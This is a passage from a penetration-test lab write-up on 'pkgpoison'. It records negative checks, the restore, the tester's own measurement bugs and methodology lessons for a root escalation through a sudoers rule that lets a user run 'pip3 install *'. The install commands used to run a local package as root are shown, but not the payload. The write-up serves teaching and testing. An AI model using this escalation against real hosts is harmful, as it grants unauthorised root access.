| No `FLAG{}` / `flag{` / `DL{` / `dl{` / `CTF{` / `pkgpoison{` anywhere | **17,563 text files / 316,301,973 bytes** (files ≤ 4 MB, `/proc /sys /run /tmp` excluded, own `dl162-*` artefacts excluded) + **14 binaries / 183,847,550 bytes** grepped with `-a`. **Total 17,577 files / 500,149,523 bytes, 0 hits.** 14 files > 4 MB are all compiler/interpreter/runtime blobs (`cc1`, `cc1plus`, `lto1`, `libpython3.8`, `libc.a`, `libicudata`, `magic.mgc`, …), listed with sizes | `grep -Il` via `find -exec … +`; control `Ubuntu` → 51 files; binary pass control: injected marker → 1 line |
| No reward file in `/root` | `ls -la /root` as `uid=0`: 3 shipped dotfiles (`.bash_history`, `.bashrc`, `.profile`) + **2 artefacts this engagement created**. No other file exists | `ls -a`, as `uid=0` |
| No reward in the web root | 3 shipped files read in full: `index.html` (589 B), `notes/note.txt` (177 B), `index.png` (chunk table read: `IHDR`, one `caBX`, 16 `IDAT`, `IEND`; **no** `tEXt`/`iTXt`/`zTXt`), plus `grep -RIn 'flag\|FLAG\|<!--\|password\|secret'` over the docroot → 1 hit, the word "password" in `note.txt` | `ls`, `grep -RIn`, PNG chunk parse |
| No third listening port | `nmap -p-` → **2 open**, `65533 closed (conn-refused)`; `/proc/net/tcp`/`tcp6` not needed — the TCP scan is exhaustive by construction | `nmap -sV -Pn -p-` |
| `dev` cannot sudo | 3 forms (`sudo -n -l`, `echo pw \| sudo -S -l`, `sudo -n /usr/bin/id`) — all refused; the third prompted and accepted the password before refusing | `sudo`, plus the policy file read |
| No setuid escalation | 11 setuid binaries, `test -w` as `dev` → 0, as `admin` → 0 | `find -perm -4000` + `test -w` per identity |
| No file capabilities | 20,087 files walked; then `/usr /bin /sbin /lib /etc /opt /home /var /root /tmp` walked; **0** xattrs, with the staged control found by the same walk | `os.getxattr` |
| No cron write primitive | `/etc/cron.d` = 1 entry (stock), `/etc/crontab` = **absent**, `/etc/cron.daily` = 3 stock scripts; all `ro` as `admin` | `ls`, `test -w` |
| No UDP service | `/proc/net/udp` = 1 header line, `/proc/net/udp6` = 1 header line | kernel table |
| `.pyc` is not writable by `dev` | 1 file, `test -w` as `uid=1000` → `NOT-writable` | `test -w`, correct identity |
| `pip3` is the *only* granted program | `sudo -l` as `admin` printed exactly **one** command line; `/etc/sudoers.d/` contains **2** files, one of which is the stock `README` | `sudo -l`, `ls /etc/sudoers.d` |

## 8. NOT tested, and discarded with reason

### NOT tested

| Item | Why |
|---|---|
| **Delivering a payload from a real public registry** (`sudo pip3 install <name>` from PyPI, or a hostile index) | **Absolute constraint: no third-party infrastructure, ever.** I measured that egress exists (`curl https://pypi.org/simple/` → `http_code 200`; `getent hosts pypi.org` → 4 AAAA records) and stopped there. **0 requests to any registry were made.** The equivalent was proved entirely on localhost with `--no-index --find-links file:///home/admin/repo2` (§Rung 4), which exercises the same installer code path |
| **Reaching `uid=0` from `dev` without `admin`** | Not attempted beyond the enumerated negatives, because F3 gives a deterministic route. **0 further attempts**; this is an untested path, **not** a claim that none exists |
| **Whether the grant also permits `-e`, `--upgrade`, `--target`, `--prefix` to redirect the install root** | `--target` and `--index-url` were measured ALLOWED at the sudoers layer; I did not exploit a `--prefix`/`--root` redirection to overwrite system files. **0 attempts.** The escalation does not need it |
| **Root SSH login** | `PermitRootLogin no` in `/etc/ssh/sshd_config` and `root:*:` in `/etc/shadow` (locked). **Read, not tested** — 0 login attempts |
| **`/etc/sudoers.d` mode 644 as a live defect** | Not tested as a vulnerability. `sudo` parsed and honoured the file (§Rung 3 positive control), which is the observation; the man-page chapter on modes is not installed on the image, so I did not claim a rule I could not read |

### Discarded, with the reason

| Hypothesis | Discarded because |
|---|---|
| "PkgPoison is dependency confusion / a poisoned public package" | There is no application and no declared dependency. 28 `.whl` + 11 `.egg-info` on the box are all stock Ubuntu, and `pip3 install` is reached through a **local path**, not a name |
| "The `index.png` hides a credential (steganography or appended data)" | PNG chunk table read: `IHDR` + `caBX` + 16 `IDAT` + `IEND`, no text chunks; `IEND` ends the file with **−4 bytes** trailing. The image is a wireframe mock-up of `index.html` |
| "`/run/sudo/ts/dev` means `dev` has a hidden grant" | A sudo timestamp can exist with an empty policy. `sudo -S -l` as `dev` → `Sorry, user dev may not run sudo on 84dbffed895e.` The timestamp is an artefact of the author's build session, not a grant |
| "`admin`'s password is guessable from context, so the `.pyc` is optional" | Not tested, and irrelevant. The `.pyc` is world-readable and its `strings` output is unambiguous; there was no reason to spend attempts on a guessing ladder |
| "The escalation needs a public package index" | Disproved by the `file://` run. The wildcard admits a local sdist |
| "The build step installs something else afterwards" | Measured: `/etc/cron.d` = 1 stock entry, no `/etc/crontab`, no scheduler that re-reads attacker-controlled config. See F5 |

---

## 9. Restore

Recreated from the image, not by undoing edits, and verified with a **positive** check
plus an impossible-name control:

```
$ docker rm -f pkgpoison_container && docker run -d --name pkgpoison_container pkgpoison:latest
$ curl -s -o /dev/null -w 'GET / -> http=%{http_code} bytes=%{size_download}\n'  http://172.17.0.6/
GET / -> http=200 bytes=589
$ curl -s -o /dev/null -w 'GET /notes/note.txt -> http=%{http_code} bytes=%{size_download}\n' http://172.17.0.6/notes/note.txt
GET /notes/note.txt -> http=200 bytes=177
$ curl -s -o /dev/null -w '... ' http://172.17.0.6/notes/nosuchfile-dl162
http=404 bytes=272
```

Residue check, all of it gone:

```
$ ls /var/www/html/                     → index.html  index.png  notes
$ ls -a /root /home/admin /home/dev     → only the shipped dotfiles
$ ls /usr/local/lib/python3.8/dist-packages/ | grep -i dl162   → none
$ ls /tmp | grep -i dl162                                 → none
$ cat /etc/sudoers.d/001-admin-task
admin ALL=(ALL) NOPASSWD: /usr/bin/pip3 install *
$ ls -l /opt/scripts/__pycache__/secret.cpython-38.pyc
-rw-r--r-- 1 admin admin 274 May 24  2025 secret.cpython-38.pyc
```

Lab is back to shipped. Image `pkgpoison:latest` reclaimed by name after this writeup;
no global prune was run.

---

## 10. Instrumentation defects — mine

Seven. The first would have **invented** a reward, the second would have **deleted** a
capability finding, and the third would have turned a control into a copy of the thing
it was controlling.

### D1 — A reward sweep that reported `FLAG{` in **every file** on the box

```
files scanned : 17563
bytes read    : 0
pattern [FLAG{]    -> 17563 file(s)
    /usr/share/readline/inputrc
    /usr/share/zoneinfo/Pacific/Niue
    … (17,563 lines)
```

The sweep was wrapped in a shell function that **did not forward `"$@"`.** Every
`scan -exec grep -Il …` therefore ran `find` with **no `-exec` at all**, and find
printed its file list, which the pipeline counted as hits. Six patterns, six identical
counts.

**Two internal cross-checks caught it, and that is the transferable part:**

1. `bytes read : 0` — impossible for 17,563 files. §19: a blank/zero count is not
   evidence.
2. every pattern returned **exactly the file count** — an oracle that always resolves
   the same way is a bias wearing the shape of an answer (§6).

**Rule.** A wrapper that builds a command line must forward its arguments, and the
cheapest test for it is a pattern you know is present: `Ubuntu` → 51 files. If the
"hit count" ever equals the "files scanned" count, the sweep is not searching.

### D2 — `getcap` is not installed, and my script printed "the detector fires" anyway

```
bash: line 2: getcap: command not found
bash: line 4: setcap: command not found
  as root, getcap sees it: bash: line 5: getcap: command not found
  as dev (uid 1000), getcap sees it: sh: 1: getcap: not found
  -> the detector fires; so the 0-line result on the real tree is a real absence
full-tree getcap line count (as root): 0
```

My script asserted the conclusion **on the line immediately after the command-not-found
lines**. This is §11 exactly: a missing tool printed nothing, exited quietly, and my
`| wc -l` turned that into a clean `0` that confirmed what I hoped. Had I not gone
looking for a positive control, I would have filed "no file capabilities on this host"
as a measured property.

**Fixed** by measuring the property directly — a file capability lives in the
`security.capability` xattr — and by **staging the control and proving the new walk
finds it** before believing its zero:

```
POSITIVE CONTROL staged. readback: 0100000200000000800000000000000000000000
files carrying security.capability (excluding the control): 0
the control is IN this list, so the walk can find one: True
```

**Rule.** A negative whose instrument is not proven present is UNTESTED. Check the
instrument's own output before quoting its result — the "command not found" was *in the
transcript*, two lines above the sentence it was supporting.

### D3 — A control that read back the payload it was meant to contrast with

My first differential control wrote witnesses to **fixed** paths (`/tmp/dl162-proof-<fixed token>.json`).
After the root run, `admin` could not overwrite the root-owned file:

```
rm: cannot remove '/tmp/dl162-results.txt': Operation not permitted
PermissionError: [Errno 13] Permission denied: '/tmp/dl162-results.txt'
--- direct read of the two witnesses:
/tmp/    : uid 0 euid 0 SUDO_USER admin
web copy : uid 0 euid 0 SUDO_USER admin
```

The "unprivileged" row of my table would have read **the root run's numbers**. The
negative was not a negative; it was a copy of the positive.

**Fixed** by giving every run a **unique token** (`STAMP=$(date +%s)-$$`), so a stale
witness cannot be mistaken for a new one. §27's rule, pointed at my own harness: an
oracle that observes a namespace your earlier action already changed is not idempotent.

**Rule.** Give every oracle run its own unique artefact name. A fixed name is an
invitation to read your own last result back as this one's.

### D4 — Two vacuous results caused by residue from my own first escalation

```
$ sudo -n /usr/bin/pip3 install --no-index --find-links file:///home/admin/repo2 dl162-probe
Looking in links: file:///home/admin/repo2
Requirement already satisfied: dl162-probe in /usr/local/lib/python3.8/dist-packages (0.0.1)
```

`dl162-probe 0.0.1` was **my own first escalation's residue**, root-installed into
`dist-packages`. pip short-circuited, never fetched the 0.0.2 sdist, never ran the new
`setup.py`, and printed a plausible line that reads like a negative result. It happened
**twice** before I noticed. The third attempt, with a fresh package name
(`dl162reg`), produced the real result quoted in §Rung 4.

**Rule.** After you escalate once on a target, your residue is part of the target's
state and will answer your next probe. Use a new package name per experiment.

### D5 — A false positive on all 14 binaries, from `grep -c` and `||`

```
files=14 bytes=183847550 files_with_hit=14
  HIT 0
0 /usr/lib/gcc/x86_64-linux-gnu/9/cc1
```

`c=$(grep -ac -e "FLAG{" … "$f" 2>/dev/null) || echo 0` — `grep -c` **exits 1 when the
count is zero**, so the `||` appended a second line and `$c` became `"0\n0"`, which is
`!= "0"`, so **every file was reported as a hit**. I was reading a shell bug as a
result, in the direction that *invents* a finding.

Fixed, and the fixed loop was itself proven able to fire before its zero was believed:

```
files=14 bytes=183847550 files_with_hit=0
=== sanity: the loop must be able to see a hit ===
  marker file -> 1 line(s)  (must be >0)
```

**Rule.** `cmd $(…) || echo default` is wrong whenever `cmd` writes a value *and* has a
non-zero exit for a legitimate outcome. And a detector that reports a hit must be shown
one before its misses are believed.

### D6 — An anomaly I explained instead of measuring, and the measurement was better

After a root run that provably wrote `uid 0` to `/var/www/html`, the `/tmp` witness still
showed `uid 1001` from `admin`'s earlier `sdist` run. My first instinct was a theory
about pip's build phases. Instead I instrumented every write and then ran a 2×2:

```
uid=0 writing a file owned by root   in sticky     /tmp/dl162stick        -> OK
uid=0 writing a file owned by admin  in sticky     /tmp/dl162stick        -> FAIL errno=13
uid=0 writing a file owned by root   in non-sticky /home/admin/dl162nostick -> OK
uid=0 writing a file owned by admin  in non-sticky /home/admin/dl162nostick -> OK
```

`/tmp` is `drwxrwxrwt`, `/home/admin/dl162nostick` is `drwxr-xr-x`; the file owner is
the only other variable. **So `uid=0` is refused `O_TRUNC` on another user's file in a
sticky directory in this container** — with `CapEff: 00000000a80425fb`, i.e. the Docker
default set including `CAP_FOWNER`. *Why* is an inference (filesystem/overlay
behaviour) and is filed as such; the 2×2 is the fact.

**Oracle-design consequence, which is what actually mattered:** never design a witness
at a path another identity may already own. Use a unique path. That is the same rule as
D3, arriving from the other direction.

### D7 — Three small ones, recorded because they are cheap and they all bit

- `bc` is not installed in this image, so a byte total came back **empty** rather than
  zero. §19: empty is untested. I computed the totals in `awk` instead.
- `nmap -sU` refused (`requires root privileges`), so the UDP answer rests on
  `/proc/net/udp{,6}`. The kernel table is a second instrument and it is sufficient, but
  the UDP conclusion is **not** backed by a packet-level negative — it is backed by a
  listening-socket count of 0.
- `man 5 sudoers` is **not installed** (`/usr/share/man/man5/` does not exist). I was
  tempted to quote the well-known "a simple file name allows any arguments" sentence
  from memory. Lab 282 and lab 93 both did. I measured the specification instead —
  14 forms — and the measurement is what the finding rests on. **A rule quoted from
  memory is not a citation.**

---

## 11. Reward

**None.** Measured absence, with the search and its counts.

| Search | Scope | Result |
|---|---|---|
| `FLAG{`, `flag{`, `DL{`, `dl{`, `CTF{`, `pkgpoison{` over text files | 17,563 files / **316,301,973 bytes** (≤ 4 MB; `/proc /sys /run /tmp` excluded; this engagement's own `dl162-*` artefacts excluded) | **0 files** |
| Same patterns over binaries, `grep -a` | 14 files / **183,847,550 bytes** | **0 files** |
| **Total** | **17,577 files / 500,149,523 bytes, 6 patterns** | **0** |
| `/root` as `uid=0` | `ls -la` | 3 shipped dotfiles + 2 artefacts this engagement created. No other file |
| Web root, read in full | `index.html`, `notes/note.txt`, `index.png` chunk table | no token; `index.png` has no `tEXt`/`iTXt`/`zTXt` |

**Positive controls for the sweep, both green:** pattern `Ubuntu` → **51 files**; and on
the binary pass, a marker appended to a copy of `/usr/bin/python3.8` → **1 line**.

**§26 was live here and it is worth naming.** The *first* sweep reported **1** hit for
every pattern, and the file was **`/tmp/reward.sh` — my own search script**, which
contains `FLAG{` inside its own pattern. Excluding `/tmp` and my own artefacts took it
to 0. A pattern distinctive enough to be a reward (`FLAG{`) is distinctive enough to
find the searcher.

---

## 12. What this lab adds to the methodology

**The class — the install path as attack surface.** Absent from 58 writeups: `pip
install` appears in **none** of them, and neither does dependency confusion or a
"version selector".

**Entry criterion.** *An attacker who controls what gets installed does not need a
vulnerability in the application.* The corollary is the half that is easy to get wrong:
**there may be no application.** Lab 162 has three files (and one subdirectory) in its docroot and a static
HTML page; the entire finding is a policy line. A tester who starts by looking for a
vulnerability in an application will not find one, and may conclude the lab is empty.

**The boundary is drawn at whatever decides the version.** Here that is one token in a
`sudoers` file: `install *`. `install` is pinned; the specifier is not. Naming the
program is not the boundary — **naming the selector is.**

**The sudoers discriminator, now at four data points.** Lab 93: an interpreter with no
argument list is arbitrary code. Lab 189: an undeclared grant with no argument
restriction. Lab 282: a grant that pins both arguments, 8 of 9 forms denied. **Lab 162:
`install *` — 6 of 14 forms allowed, and the 6 allowed include every form that names a
different artifact or a different index.** The discriminator remains the **argument
specification**, never the nature of the program. `pip3` is not an interpreter the way
`debugfs` is not; it is dangerous for the same structural reason, and the way to tell is
to enumerate forms, not to reason about the binary.

**Two measured details the man page would not have given me.** `*` spans **spaces**
(`install --target /tmp/x --help` is allowed), and `sudo` does **not** launder a shell,
so `$IFS` reaches pip literally. Anyone writing this rule from memory would get the
first wrong and might over-claim the second.

**And the lab's own receipts.** `/root/.bash_history` contains `pip3 install uncompyle6`,
run by root while the lab was being built, on the same machine whose sudoers file grants
`pip3 install` to a user. The class was sitting in the build history of the target,
one indentation level away from being the vulnerability — which is §188's
"the credential lives in the build layer" arriving as a *technique* rather than a leak.
